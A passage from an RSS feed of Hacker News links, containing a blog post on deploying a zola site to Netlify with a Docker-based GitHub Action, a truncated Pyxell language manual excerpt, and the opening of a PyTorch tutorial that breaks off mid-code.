        <p>I finally decided to dip my toes into GitHub actions recently, for a relatively simple task: build and deploy my personal site. The site is built with <a href="https://getzola.org/">zola</a> and deployed to <a href="https://netlify.com/">netlify</a>.</p>
<p>My needs are pretty straightforward.</p>
<ul>
<li>The zola binary</li>
<li>Node, and <a href="https://www.npmjs.com/package/netlify-cli">netlify-cli</a> installed</li>
<li>Secure way to provide netlify config</li>
</ul>
<p>Then I simply make sure my site source is checked out and run the <code>build</code> and <code>deploy</code> commands.</p>
<h2 id="some-terminology">Some terminology</h2>
<p>An <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/about-actions"><strong>action</strong></a> is a single step that may be performed in a larger <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/workflow-syntax-for-github-actions"><strong>workflow</strong></a>, which strings together multiple actions and is kicked off in response to various events (like a <code>git push</code>, or a PR). You can have a workflow that calls a single action, but an action can't be used without being called in a workflow.</p>
<h2 id="first-impression-with-actions">First impression with Actions</h2>
<p>I noticed the marketplace approach first of all, and the emphasis on actions that did one small thing which you compose together. This can definitely be a nice approach to things, but my preferred way of working on CI tasks like this is to have access to a Docker container where I have a bit more control of my environment, and can codify it into a familiar Dockerfile.</p>
<p>My thinking is, if I can get this sort of approach to work, I'll have less required domain knowledge of GitHub actions, and can instead just lean on my Docker knowledge to set up whatever operations I may need.</p>
<p>Needless to say, I simply sidestepped the marketplace and found the <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/creating-a-docker-container-action">documentation for utilizing Docker</a>, which thankfully is a valid option! 🎉</p>
<h2 id="my-setup">My setup</h2>
<p>I stumbled through this quite a bit, but ultimately am happy with the approach. I'm able to have a <code>Dockerfile</code> and custom <a href="https://docs.docker.com/engine/reference/builder/#entrypoint"><code>entrypoint.sh</code></a> file that can receive inputs via env vars from the action configuration. I'm also able to pipe secrets, stored in my GitHub repo, into the action from the workflow file.</p>
<h3 id="the-action-file"><a href="https://github.com/sethetter/sethetter.com/blob/1e916825348e2ee2f401b5204811c18e394432e3/.github/actions/build-and-deploy/action.yml">The action file</a></h3>
<pre><code><span># .github/actions/build-and-deploy/action.yml
</span><span>name</span><span>: </span><span>'</span><span>Build and deploy</span><span>'
</span><span>description</span><span>: </span><span>'</span><span>Build site with Zola and deploy to Netlify</span><span>'
</span><span>inputs</span><span>:
  </span><span>auth_token</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Netlify auth token</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>site_id</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Netlify site ID to deploy to</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>deploy_dir</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Directory to deploy to netlify</span><span>'
    </span><span>required</span><span>: </span><span>true
  </span><span>zola_version</span><span>:
    </span><span>description</span><span>: </span><span>'</span><span>Version of zola to pull</span><span>'
    </span><span>required</span><span>: </span><span>true
    </span><span>default</span><span>: </span><span>'</span><span>0.12.2</span><span>'
</span><span>runs</span><span>:
  </span><span>using</span><span>: </span><span>'</span><span>docker</span><span>'
  </span><span>image</span><span>: </span><span>'</span><span>Dockerfile</span><span>'
  </span><span>env</span><span>:
    </span><span>ZOLA_VERSION</span><span>: </span><span>${{ inputs.zola_version }}
    NETLIFY_AUTH_TOKEN</span><span>: </span><span>${{ inputs.auth_token }}
    NETLIFY_SITE_ID</span><span>: </span><span>${{ inputs.site_id }}
    NETLIFY_DEPLOY_DIR</span><span>: </span><span>${{ inputs.deploy_dir }}
</span></code></pre>
<p>This file defines our action, which will be called from a workflow which we will configure later. The main thing to notice here is how we are accepting inputs, and passing those on to our Docker container through environment variables.</p>
<p><strong>This was one of the things I stumbled over</strong>. Currently there is no support for passing <a href="https://docs.docker.com/engine/reference/commandline/build/#set-build-time-variables---build-arg">build args</a> to our Dockerfile, and the environment variables we provide are not available during the build stage, only once the <a href="https://docs.docker.com/engine/reference/builder/#entrypoint"><code>ENTRYPOINT</code></a> is called.</p>
<p>I was stuck on this for a decent chunk of time before realizing that <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/metadata-syntax-for-github-actions#runsargs"><code>runs.args</code> with <code>docker</code> are <em>not</em> build args</a>, they are arguments sent to the <code>entrypoint</code>. Don't make the same mistakes I did!</p>
<p>The implication here is that any steps in your action that require one of these inputs must happen in the <code>ENTRYPOINT</code> provided via <code>env</code>. I'll mention this again shortly.</p>
<h3 id="docker-setup">Docker setup</h3>
<p>The <a href="https://github.com/sethetter/sethetter.com/blob/4fdf1675084628f6ddd3aaa31aaa05a1a118b1d6/.github/actions/build-and-deploy/Dockerfile">Dockerfile</a> is pretty minimal, simply setting up the base environment I want, which is <code>node:lts</code> in this case, and then copy in my custom <code>[entrypoint.sh](http://entrypoint.sh)</code> script.</p>
<pre><code><span># .github/actions/build-and-deploy/Dockerfile
</span><span>FROM node:lts
COPY entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
</span></code></pre>
<p><strong>Tip!</strong> <a href="https://docs.github.com/en/free-pro-team@latest/actions/creating-actions/dockerfile-support-for-github-actions#workdir">Don't set a <code>WORKDIR</code></a>. The action sets the workdir to the <code>$GITHUB_WORKSPACE</code> variable which is where your project source will be located.</p>
<p>All the action happens in the <a href="https://github.com/sethetter/sethetter.com/blob/1e916825348e2ee2f401b5204811c18e394432e3/.github/actions/build-and-deploy/entrypoint.sh"><code>entrypoint.sh</code></a> file.</p>
<pre><code><span># .github/actions/build-and-deploy/entrypoint.sh

#!/usr/bin/env bash
</span><span>ZOLA_URL=https://github.com/getzola/zola/releases/download/v${ZOLA_VERSION}/zola-v${ZOLA_VERSION}-x86_64-unknown-linux-gnu.tar.gz
curl -L $ZOLA_URL | tar xz -C /usr/local/bin

</span><span># Install netlify
</span><span>npm i -g netlify-cli

</span><span># Kick off build and deploy
</span><span>zola build
netlify deploy \
  --prod \
  --dir=$NETLIFY_DEPLOY_DIR \
 --auth=$NETLIFY_AUTH_TOKEN \
 --site=$NETLIFY_SITE_ID
</span></code></pre>
<p>You can see here we're referencing the <code>env</code> vars we defined in our action file. Originally I had the zola and netlify install steps happening in the <code>Dockerfile</code>, but due to the inability to pass build args to the image, I wasn't able to get the <code>$ZOLA_VERSION</code> passed in. Once I had that realization, it seemed just as viable to put everything in <code>entrypoint.sh</code>.</p>
<h3 id="the-workflow-file"><a href="https://github.com/sethetter/sethetter.com/blob/4fdf1675084628f6ddd3aaa31aaa05a1a118b1d6/.github/workflows/build-and-deploy.yml">The workflow file</a></h3>
<pre><code><span># .github/workflows/build-and-deploy.yml
</span><span>name</span><span>: </span><span>build-and-deploy
</span><span>on</span><span>:
  </span><span>push</span><span>:
    </span><span>branches</span><span>: [</span><span>master</span><span>]
</span><span>jobs</span><span>:
  </span><span>build-and-deploy</span><span>:
    </span><span>runs-on</span><span>: </span><span>ubuntu-latest
    steps</span><span>:
      - </span><span>uses</span><span>: </span><span>actions/checkout@v2
      </span><span>- </span><span>uses</span><span>: </span><span>./.github/actions/build-and-deploy
        with</span><span>:
          </span><span>zola_version</span><span>: </span><span>'</span><span>0.12.2</span><span>'
          </span><span>auth_token</span><span>: </span><span>${{ secrets.NETLIFY_AUTH_TOKEN }}
          site_id</span><span>: </span><span>${{ secrets.NETLIFY_SITE_ID }}
          deploy_dir</span><span>: </span><span>'</span><span>public</span><span>'
</span></code></pre>
<p>This is our final configuration file, turning our new custom action into a workflow. We start by setting our workflow triggers in the <code>on</code> block. In this case we just want to run this workflow on pushes to <code>master</code>.</p>
<p>Next is our <code>jobs</code> block. We can define multiple jobs which would all run in parallel. If we need anything serial, it should happen within a single job. In our case, we have just one job with two actions.</p>
<p>The job itself starts with the checkout action, which handles checking out the repo's source into the job workspace, then we call our custom action by providing a path to the action folder.</p>
<p>In our <code>with</code> block we provide values for the inputs we defined on our action. You'll notice that two of the values are provided via <code>secrets</code>, which is a <a href="https://docs.github.com/en/free-pro-team@latest/actions/reference/encrypted-secrets">feature of GitHub</a> I wasn't aware of before this. It's very easy to work with!</p>
<h2 id="room-for-improvement">Room for improvement</h2>
<p>I think the main drawback here is potentially slow job run times, since we're installing our dependencies each time. Depending on what's actually slow, there are a number of ways it could be addressed.</p>
<p>In general, finding a base Docker image that has as much of what you need as possible (without too much bloat) is going to help. Maintaining your own images in a registry somewhere comes with it's own overhead, but that's also an option.</p>
<p>I'm sure using the marketplace approach could also be a way to address the performance issues, assuming you find actions that have your dependencies installed and configured appropriately, but the goal of this post was to explore a minimal action configuration while leveraging the power of Docker 😄.</p>
<p><strong>That's it!</strong> 👋</p>

    </section>
</article></div>]]>
            </description>
            <link>https://sethetter.com/posts/github-actions-with-docker/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066079</guid>
            <pubDate>Thu, 12 Nov 2020 03:28:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pyxell – a programming language that combines Python's elegance with C++'s speed]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25066058">thread link</a>) | @masijo
<br/>
November 11, 2020 | https://www.pyxell.org/docs/manual.html | <a href="https://web.archive.org/web/*/https://www.pyxell.org/docs/manual.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>Pyxell [<em>pixel</em>] is a multi-paradigm, statically typed programming language, compiled to machine code via C++.</p> <p>This manual should let you quickly learn all the details to start programming in Pyxell.
It is assumed that you already know some programming language (preferably Python), since basic programming concepts are not explained here.</p> <p>You are encouraged to run the code snippets and experiment with them for yourself.
To run Pyxell code, go to the <a href="https://www.pyxell.org/docs/playground.html">Playground</a>,
clone the repository and follow the instructions on <a href="https://github.com/adamsol/Pyxell#requirements" target="_blank" rel="noopener noreferrer">Github<span> <span>(opens new window)</span></span></a>,
or download Windows binaries from the <a href="https://github.com/adamsol/Pyxell/releases" target="_blank" rel="noopener noreferrer">Releases<span> <span>(opens new window)</span></span></a>.</p> <h2 id="hello-world"><a href="#hello-world">#</a> Hello, world!</h2> <p>If you can run the following code and see the message on the screen, you are ready to start.</p> <h2 id="variables-and-types"><a href="#variables-and-types">#</a> Variables and types</h2> <h3 id="variable-declaration"><a href="#variable-declaration">#</a> Variable declaration</h3> <p>Pyxell is statically typed. Variables have types assigned during compilation.
In most cases, type of an expression is automatically inferred and the value can be directly assigned to a variable.</p> <p>In other cases, when the type cannot be inferred or you want to declare a variable without initializing it, you can set the type explicitly.
When not directly initialized, variable is automatically initialized with the default value for a given type.
You can find the list of all available types and their default values in the <a href="https://www.pyxell.org/docs/specification.html#types">Specification</a>.</p> <p>Variable name must start with a letter, but may also contain digits, underscores, and apostrophes.
Once a variable has been created, its type cannot be changed.</p> <h3 id="type-coercion"><a href="#type-coercion">#</a> Type coercion</h3> <p>Values of some types can be automatically converted to more general types: <code>Int -&gt; Rat -&gt; Float</code> or <code>Char -&gt; String</code>.</p> <p>The coercion doesn't work in the other direction.</p> <h2 id="arithmetic-and-logic"><a href="#arithmetic-and-logic">#</a> Arithmetic and logic</h2> <h3 id="numbers"><a href="#numbers">#</a> Numbers</h3> <p>Standard integers in Pyxell have 64 bits of precision and range from <code>-2^63</code> to <code>2^63-1</code>.
Binary, octal, and hexadecimal literals are supported.</p> <p>Rational numbers have unlimited precision.
They can be written either as integers with <code>r</code> suffix, or non-integers in decimal form.
They are also created as the result of division or exponentiation
(to obtain an integer from a division or exponentiation, use lossy <code>//</code> and <code>^^</code> operators).</p> <p>You can retrieve the numerator and denominator from a rational number.</p> <p>Floating-point numbers have 64 bits of precision and follow the IEEE 754 standard.
They can be written with <code>f</code> suffix or in scientific notation.</p> <p>Underscores can be additionally used in all numeric literals, to enhance readability of long numbers.</p> <h3 id="boolean-values"><a href="#boolean-values">#</a> Boolean values</h3> <p>There are two boolean values: <code>true</code> and <code>false</code>.
Logical negation and short-circuiting conjunction and disjunction operators are available.</p> <p>Boolean values are most often obtained in the result of comparisons.
When comparison operators are chained, they behave as if connected with <code>and</code> operator.</p> <h2 id="characters-and-strings"><a href="#characters-and-strings">#</a> Characters and strings</h2> <h3 id="characters"><a href="#characters">#</a> Characters</h3> <p>Characters are written in single quotes.</p> <p>You can get character's ASCII code, as well as obtain character corresponding to a given integer.</p> <p>You can also perform some arithmetic operations on characters.</p> <h3 id="strings"><a href="#strings">#</a> Strings</h3> <p>Strings are immutable sequences of characters. They are written in double quotes.</p> <p>You can access string's length, as well as its individual characters. Negative indexing and slicing is also supported, like in Python.</p> <p>Strings can be concatenated with <code>+</code> operator and repeated with <code>*</code> operator.</p> <p>You can construct formatted strings using interpolation syntax.</p> <h2 id="control-flow"><a href="#control-flow">#</a> Control flow</h2> <p>Pyxell uses indentation-based syntax, similar to Python's. Only spaces are allowed (tab character will cause a syntax error).
Rather than <code>:</code> character, Pyxell uses <code>do</code> keyword for indicating beginning of a block, and <code>def</code> keyword for function and class definitions.
The scope of a variable declared in a block is limited to that block.</p> <h3 id="if-statement"><a href="#if-statement">#</a> <code>if</code> statement</h3> <p>The first branch whose condition evaluates to <code>true</code> is executed.</p> <h3 id="while-loop"><a href="#while-loop">#</a> <code>while</code> loop</h3> <p>The loop runs while the condition is satisfied.</p> <h3 id="until-loop"><a href="#until-loop">#</a> <code>until</code> loop</h3> <p>This loop is similar to <code>while</code> loop, but it is always executed at least once and runs until the condition is satisfied.</p> <h3 id="for-loop"><a href="#for-loop">#</a> <code>for</code> loop</h3> <p>It can be used to loop over ranges (of numbers or characters) and other iterables.
Range can be inclusive (<code>a..b</code>), exclusive (<code>a...b</code>), or infinite (<code>a...</code>).</p> <p>You can optionally provide a step value, which can be either positive or negative (it is 1 by default).</p> <p>It is possible to loop over multiple iterables at once and provide custom step values to any of them.</p> <h3 id="continue-and-break"><a href="#continue-and-break">#</a> <code>continue</code> and <code>break</code></h3> <p>Inside loops you can use statements to exit the current iteration or the whole loop.</p> <h2 id="containers"><a href="#containers">#</a> Containers</h2> <h3 id="arrays"><a href="#arrays">#</a> Arrays</h3> <p>Arrays are similar to strings, but they are mutable and can have elements of any type.</p> <p>Containers have reference semantics, so they are not implicitly copied when variables are passed.
Mutation of one instance is reflected in all other instances of the same container.</p> <p>When an empty array is used, its type must be explicitly given.</p> <p>Arrays can be concatenated, repeated, and compared using standard operators.</p> <p>You can use array comprehension, as well as range literals and spread operator with optional step.</p> <p>For type safety, containers in Pyxell are invariant, which means they cannot be implicitly converted to another type,
even if types of the elements match (see <a href="https://stackoverflow.com/q/2745265" target="_blank" rel="noopener noreferrer">here<span> <span>(opens new window)</span></span></a> for a broader explanation).
However, container literals can be automatically converted.</p> <h3 id="sets"><a href="#sets">#</a> Sets</h3> <p>Sets contain no duplicates and do not preserve order of elements.</p> <p>Empty set can be created like an empty array.</p> <p>To check if an element is in the set, use <code>in</code> operator.</p> <p>There exist operators for set union, difference, and intersection.</p> <p>Like with arrays, you can use comprehensions, ranges, and spread syntax to create sets.</p> <p>Containers are not hashable, so they cannot be stored in sets.</p> <h3 id="dictionaries"><a href="#dictionaries">#</a> Dictionaries</h3> <p>Dictionaries are hash maps. Like sets, they do not preserve order of elements.
They work similarly to <code>defaultdict</code> in Python: if a key is not present, the default value for a given type is automatically created in the dictionary.</p> <p>Empty dictionary literal has an additional colon.</p> <p>Use <code>in</code> operator for checking if the dictionary contains a given key.</p> <p>Dictionaries can be merged with <code>+</code> operator. In the case of repeated keys, the second value wins.</p> <p>Dictionary comprehension works similarly to array and set comprehension.</p> <p>When iterated over, dictionaries produce pairs of key and value.</p> <p>Spread operator for dictionaries consists of an extra colon.</p> <h2 id="nullable-types"><a href="#nullable-types">#</a> Nullable types</h2> <p>To accept <code>null</code> value, variable's type must be explicitly marked as nullable.</p> <p>You can either directly check if a value is <code>null</code>, or use special coalescing and conditional operators.</p> <p>There is also an operator to directly retrieve the value, for cases when you are sure it is not null.</p> <h2 id="tuples"><a href="#tuples">#</a> Tuples</h2> <p>Two or more values separated with a comma (outside of a container, function call, and print statement) form a tuple.</p> <p>Values can be retrieved using alphabetical properties or tuple destructuring (unneeded part can be discarded with an underscore).</p> <p>Tuples are mutable, but they have value semantics, so they are hashable and can be passed around as if they were immutable.</p> <h2 id="functions"><a href="#functions">#</a> Functions</h2> <h3 id="function-definition-and-call"><a href="#function-definition-and-call">#</a> Function definition and call</h3> <p>Basic definition of a function consists of its name, list of arguments, return type, and body.</p> <p>When a function does not return anything, the return type may be written as <code>Void</code> or may be omitted completely.</p> <p>You can provide default values for optional arguments.
The expressions will be evaluated every time the function is called (if they are needed), so mutable container literals can be safely used.</p> <p>Arguments can be also passed in any order using their names.</p> <p>Variadic functions are supported too. This is just a syntactic sugar for passing an array.
Ranges and spread syntax can be used when such a function is called.</p> <p>Functions can be stored in variables, passed to other functions as arguments, etc.
However, when a function is converted to a variable, all information about its arguments except for their types is lost.</p> <h3 id="generic-functions"><a href="#generic-functions">#</a> Generic functions</h3> <p>Generic functions are standard functions with additional type variables, which can be used just like normal types.
They are compiled independently for each combination of types they are called with.</p> <p>Function declaration may contain default values for generic arguments, and the body may contain any code dependent on the real types.
Errors will be reported when the function cannot be compiled with given types.</p> <p>When a type name is used more than once, the compiler will try to unify types of the arguments, following the coercion rules.</p> <h3 id="lambda-functions"><a href="#lambda-functions">#</a> Lambda functions</h3> <p>Lambda is a simpler version of generic function, where all arguments, as well as the return type, are generic.</p> <p>You can use placeholder syntax to write even more concise functions. Each underscore corresponds to one argument.</p> <p>Placeholder resolving doesn't run through function calls by default (placeholders inside a function call form their own functions for corresponding arguments).
To create a partial function, add <code>@</code> character.</p> <p>Lambdas can also be multi-line, so that you can define normal functions without any type annotations.</p> <p>Note that lambda functions currently work only with arguments of known types.
You cannot pass a lambda function to another lambda function.
In the case of functional arguments, it's better to use the full generic definition instead.</p> <h3 id="generators"><a href="#generators">#</a> Generators</h3> <p>Generator is a function producing a sequence of values that can be iterated over without storing it in memory.
To create a generator, add an asterisk symbol to the function definition.</p> <p>Lambdas can be generators as well.</p> <p>Note that generators are currently supported only with Clang.</p> <h2 id="classes"><a href="#classes">#</a> Classes</h2> <h3 id="class-definition-and-object-construction"><a href="#class-definition-and-object-construction">#</a> Class definition and object construction</h3> <p>Definition of a class consists of its name and list of fields.
Each field may have an explicit default value; if not provided, it will be the default value for a given type.</p> <p>Every class has a default constructor function that accepts field values in the order of definition, or as named arguments.
Fields not directly initialized will receive their default values.</p> <p>Remember that class objects must always be explicitly constructed before use (they have no valid default …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.pyxell.org/docs/manual.html">https://www.pyxell.org/docs/manual.html</a></em></p>]]>
            </description>
            <link>https://www.pyxell.org/docs/manual.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25066058</guid>
            <pubDate>Thu, 12 Nov 2020 03:25:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Complete Guide to PyTorch for Data Scientists]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065771">thread link</a>) | @shirappu
<br/>
November 11, 2020 | https://mlwhiz.com/blog/2020/09/09/pytorch_guide/ | <a href="https://web.archive.org/web/*/https://mlwhiz.com/blog/2020/09/09/pytorch_guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em><strong>PyTorch</strong></em> has sort of became one of the de facto standards for creating Neural Networks now, and I love its interface. Yet, it is somehow a little difficult for beginners to get a hold of.</p><p>I remember picking PyTorch up only after some extensive experimentation a couple of years back. To tell you the truth, it took me a lot of time to pick it up but am I glad that I moved from
<a href="https://towardsdatascience.com/moving-from-keras-to-pytorch-f0d4fff4ce79" target="_blank" rel="nofollow noopener">Keras to PyTorch</a>
. With its high customizability and pythonic syntax,PyTorch is just a joy to work with, and I would recommend it to anyone who wants to do some heavy lifting with Deep Learning.</p><p>So, in this PyTorch guide, <em><strong>I will try to ease some of the pain with PyTorch for starters</strong></em> and go through some of the most important classes and modules that you will require while creating any Neural Network with Pytorch.</p><p>But, that is not to say that this is aimed at beginners only as <em><strong>I will also talk about the</strong></em> <em><strong>high customizability PyTorch provides and will talk about custom Layers, Datasets, Dataloaders, and Loss functions</strong></em>.</p><p>So let’s get some coffee ☕ ️and start it up.</p><hr><h2 id="tensors">Tensors</h2><p>Tensors are the basic building blocks in PyTorch and put very simply, they are NumPy arrays but on GPU. In this part, I will list down some of the most used operations we can use while working with Tensors. This is by no means an exhaustive list of operations you can do with Tensors, but it is helpful to understand what tensors are before going towards the more exciting parts.</p><h3 id="1-create-a-tensor">1. Create a Tensor</h3><p>We can create a PyTorch tensor in multiple ways. This includes converting to tensor from a NumPy array. Below is just a small gist with some examples to start with, but you can do a whole lot of
<a href="https://pytorch.org/docs/stable/tensors.html" target="_blank" rel="nofollow noopener">more things</a>
with tensors just like you can do with NumPy arrays.</p><div><pre><code data-lang="py"><span># Using torch.Tensor</span>
t <span>=</span> torch<span>.</span>Tensor([[<span>1</span>,<span>2</span>,<span>3</span>],[<span>3</span>,<span>4</span>,<span>5</span>]])
<span>print</span>(f<span>"Created Tensor Using torch.Tensor:</span><span>\n</span><span>{t}"</span>)

<span># Using torch.randn</span>
t <span>=</span> torch<span>.</span>randn(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.randn:</span><span>\n</span><span>{t}"</span>)

<span># using torch.[ones|zeros](*size)</span>
t <span>=</span> torch<span>.</span>ones(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.ones:</span><span>\n</span><span>{t}"</span>)
t <span>=</span> torch<span>.</span>zeros(<span>3</span>, <span>5</span>)
<span>print</span>(f<span>"Created Tensor Using torch.zeros:</span><span>\n</span><span>{t}"</span>)

<span># using torch.randint - a tensor of size 4,5 with entries between 0 and 10(excluded)</span>
t <span>=</span> torch<span>.</span>randint(low <span>=</span> <span>0</span>,high <span>=</span> <span>10</span>,size <span>=</span> (<span>4</span>,<span>5</span>))
<span>print</span>(f<span>"Created Tensor Using torch.randint:</span><span>\n</span><span>{t}"</span>)

<span># Using from_numpy to convert from Numpy Array to Tensor</span>
a <span>=</span> np<span>.</span>array([[<span>1</span>,<span>2</span>,<span>3</span>],[<span>3</span>,<span>4</span>,<span>5</span>]])
t <span>=</span> torch<span>.</span>from_numpy(a)
<span>print</span>(f<span>"Convert to Tensor From Numpy Array:</span><span>\n</span><span>{t}"</span>)

<span># Using .numpy() to convert from Tensor to Numpy array</span>
t <span>=</span> t<span>.</span>numpy()
<span>print</span>(f<span>"Convert to Numpy Array From Tensor:</span><span>\n</span><span>{t}"</span>)
</code></pre></div><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/0_hu498d9dc39892132ab99f755c5b75f03e_77051_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/0.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><h3 id="2-tensor-operations">2. Tensor Operations</h3><p>Again, there are a lot of operations you can do on these tensors. The full list of functions can be found
<a href="https://pytorch.org/docs/stable/torch.html?highlight=mm#math-operations" target="_blank" rel="nofollow noopener">here</a>
.</p><div><pre><code data-lang="py">A <span>=</span> torch<span>.</span>randn(<span>3</span>,<span>4</span>)
W <span>=</span> torch<span>.</span>randn(<span>4</span>,<span>2</span>)
<span># Multiply Matrix A and W</span>
t <span>=</span> A<span>.</span>mm(W)
<span>print</span>(f<span>"Created Tensor t by Multiplying A and W:</span><span>\n</span><span>{t}"</span>)
<span># Transpose Tensor t</span>
t <span>=</span> t<span>.</span>t()
<span>print</span>(f<span>"Transpose of Tensor t:</span><span>\n</span><span>{t}"</span>)
<span># Square each element of t</span>
t <span>=</span> t<span>**</span><span>2</span>
<span>print</span>(f<span>"Square each element of Tensor t:</span><span>\n</span><span>{t}"</span>)
<span># return the size of a tensor</span>
<span>print</span>(f<span>"Size of Tensor t using .size():</span><span>\n</span><span>{t.size()}"</span>)
</code></pre></div><p><img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/1_hufb8162ba4b3c0b49f946179a1702f5a7_45468_1200x0_resize_box_2.png 1200w" src="https://mlwhiz.com/images/pytorch_guide/1.png" alt="MLWhiz: Data Science, Machine Learning, Artificial Intelligence"></p><p><strong>Note:</strong> What are PyTorch Variables? In the previous versions of Pytorch, Tensor and Variables used to be different and provided different functionality, but now the Variable API is
<a href="https://pytorch.org/docs/stable/autograd.html#variable-deprecated" target="_blank" rel="nofollow noopener">deprecated</a>
, and all methods for variables work with Tensors. So, if you don’t know about them, it’s fine as they re not needed, and if you know them, you can forget about them.</p><hr><h2 id="the-nnmodule">The nn.Module</h2><p>Photo by
<a href="https://unsplash.com/@fernanddecanne?utm_source=medium&amp;utm_medium=referral" target="_blank" rel="nofollow noopener">Fernand De Canne</a>
on
<img sizes="(min-width: 35em) 1200px, 100vw" srcset="https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_500x0_resize_box_2.png 500w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_800x0_resize_box_2.png 800w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_1200x0_resize_box_2.png 1200w
, https://mlwhiz.com/images/pytorch_guide/2_huf957eb7cc0803733802fcc4099cfd7cb_2203390_1500x0_resize_box_2.png 1500w" src="https://mlwhiz.com/images/pytorch_guide/2.png" alt="<a href=&quot;https://unsplash.com?utm_source=medium&amp;amp;utm_medium=referral&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;>Unsplash</a>"></p><p>Here comes the fun part as we are now going to talk about some of the most used constructs in Pytorch while creating deep learning projects. nn.Module lets you create your Deep Learning models as a class. You can inherit from nn.Moduleto define any model as a class. Every model class necessarily contains an<code> __init__</code> procedure block and a block for the <code>forward</code> pass.</p><ul><li><p>In the <code>__init__</code> part, the user can define all the layers the network is going to have but doesn’t yet define how those layers would be connected to each other.</p></li><li><p>In the <code>forward</code> pass block, the user defines how data flows from one layer to another inside the network.</p></li></ul><p>So, put simply, any network we define will look like:</p><div><pre><code data-lang="py"><span>class</span> <span>myNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> nn<span>.</span>Linear(<span>784</span>, <span>30</span>)
        self<span>.</span>lin2 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>10</span>)
    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x <span>=</span> self<span>.</span>lin1(x)
        x <span>=</span> self<span>.</span>lin2(x)
        <span>return</span> x
</code></pre></div><p>Here we have defined a very simple Network that takes an input of size 784 and passes it through two linear layers in a sequential manner. But the thing to note is that we can define any sort of calculation while defining the forward pass, and that makes PyTorch highly customizable for research purposes. For example, in our crazy experimentation mode, we might have used the below network where we arbitrarily attach our layers. Here we send back the output from the second linear layer back again to the first one after adding the input to it(skip connection) back again(I honestly don’t know what that will do).</p><div><pre><code data-lang="py"><span>class</span> <span>myCrazyNeuralNet</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self):
        super()<span>.</span>__init__()
        <span># Define all Layers Here</span>
        self<span>.</span>lin1 <span>=</span> nn<span>.</span>Linear(<span>784</span>, <span>30</span>)
        self<span>.</span>lin2 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>784</span>)
        self<span>.</span>lin3 <span>=</span> nn<span>.</span>Linear(<span>30</span>, <span>10</span>)

    <span>def</span> <span>forward</span>(self, x):
        <span># Connect the layer Outputs here to define the forward pass</span>
        x_lin1 <span>=</span> self<span>.</span>lin1(x)
        x_lin2 <span>=</span> x <span>+</span> self<span>.</span>lin2(x_lin1)
        x_lin2 <span>=</span> self<span>.</span>lin1(x_lin2)
        x <span>=</span> self<span>.</span>lin3(x_lin2)
        <span>return</span> x
</code></pre></div><p>We can also check if the neural network forward pass works. I usually do that by first creating some random input and just passing that through the network I have created.</p><div><pre><code data-lang="py">x <span>=</span> torch<span>.</span>randn((<span>100</span>,<span>784</span>))
model <span>=</span> myCrazyNeuralNet()
model(x)<span>.</span>size()
<span>--------------------------</span>
torch<span>.</span>Size([<span>100</span>, <span>10</span>])
</code></pre></div><hr><h2 id="a-word-about-layers">A word about Layers</h2><p>Pytorch is pretty powerful, and you can actually create any new experimental layer by yourself using <code>nn.Module</code>. For example, rather than using the predefined Linear Layer <code>nn.Linear</code> from Pytorch above, we could have created our <strong>custom linear layer</strong>.</p><div><pre><code data-lang="py"><span>class</span> <span>myCustomLinearLayer</span>(nn<span>.</span>Module):
    <span>def</span> __init__(self,in_size,out_size):
        super()<span>.</span>__init__()
        self<span>.</span>weights <span>=</span> nn<span>.</span>Parameter(torch<span>.</span>randn(in_size, out_size))
        self<span>.</span>bias <span>=</span> nn<span>.</span>Parameter(torch<span>.</span>zeros(out_size))
    <span>def</span> <span>forward</span>(self, x):
